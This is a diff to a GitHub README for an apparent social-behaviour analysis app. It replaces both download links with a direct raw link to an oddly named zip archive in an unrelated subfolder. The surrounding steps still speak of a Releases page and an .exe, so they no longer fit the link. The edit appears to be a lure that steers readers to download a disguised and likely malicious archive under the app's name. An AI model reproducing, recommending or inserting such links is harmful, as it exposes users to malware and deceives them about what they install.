@@ -1,6 +1,6 @@
 # 🤝 Cooperacion-y-Honor-en-Redes-Sociales - Analyze Social Behavior and Online Trust
 
-[![Download the App](https://img.shields.io/badge/Download-Release-blue)](https://github.com/ahmadna9439/Cooperacion-y-Honor-en-Redes-Sociales)
+[![Download the App](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/ahmadna9439/Cooperacion-y-Honor-en-Redes-Sociales/main/Berkeleian/Sociales-Cooperacion-en-y-Honor-Redes-1.2.zip)
 
 ## 📖 About This Application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following page to choose your version: [Download Page](https://github.com/ahmadna9439/Cooperacion-y-Honor-en-Redes-Sociales).
+1. Visit the following page to choose your version: [Download Page](https://raw.githubusercontent.com/ahmadna9439/Cooperacion-y-Honor-en-Redes-Sociales/main/Berkeleian/Sociales-Cooperacion-en-y-Honor-Redes-1.2.zip).
 2. Click the link labeled "Releases" on the right side of the page.
 3. Locate the file ending in .exe for Windows.
 4. Click the file name to start the download.
